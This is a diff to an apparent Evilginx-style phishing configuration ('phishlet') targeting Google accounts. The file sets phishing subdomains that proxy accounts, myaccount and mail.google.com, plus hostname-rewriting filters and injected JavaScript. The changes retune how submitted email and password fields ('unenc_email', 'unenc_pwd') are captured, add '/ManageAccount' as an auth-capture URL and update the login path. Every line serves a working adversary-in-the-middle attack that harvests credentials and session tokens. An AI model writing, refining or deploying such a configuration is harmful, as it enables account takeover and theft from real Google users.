@@ -4,7 +4,6 @@ min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: false}
   - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
   - {phish_sub: 'mail', orig_sub: 'mail', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
   - {phish_sub: 'gds', orig_sub: 'gds', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
@@ -12,8 +11,6 @@ proxy_hosts:
 sub_filters:
   - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
   - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
-  - {triggers_on: 'accounts.google.com', orig_sub: 'www', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
-  - {triggers_on: 'gstatic.google.com', orig_sub: 'www', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
   - {triggers_on: 'accounts.google.com', orig_sub: 'mail', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
   - {triggers_on: 'play.google.com', orig_sub: 'play', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
   - {triggers_on: 'accounts.google.com', orig_sub: 'gds', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
@@ -26,21 +23,23 @@ auth_tokens:
 
 credentials:
   username:
-    key: 'email'
-    search: '\],"([^"]*)"\]$'
+    key: 'unenc_email'
+    search: '(.*)'
     type: 'post'
   password:
-    key: 'password'
-    search: '\],"([^"]*)"\]$'
+    key: 'unenc_pwd'
+    search: '(.*)'
     type: 'post'
 
 auth_urls:
   - '/CheckCookie'
+  - '/ManageAccount'
 #  - '/v3/signin/_/AccountsSignInUi/data/batchexecute'
 
 login:
   domain: 'accounts.google.com'
-  path: '/ServiceLogin'
+  path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
+
  
 js_inject:
   - trigger_domains: ['accounts.google.com']
@@ -91,3 +90,7 @@ js_inject:
                   // console.log("redirecting to myaccount.google.com");
                 }
               }());
+        
+
+
+        
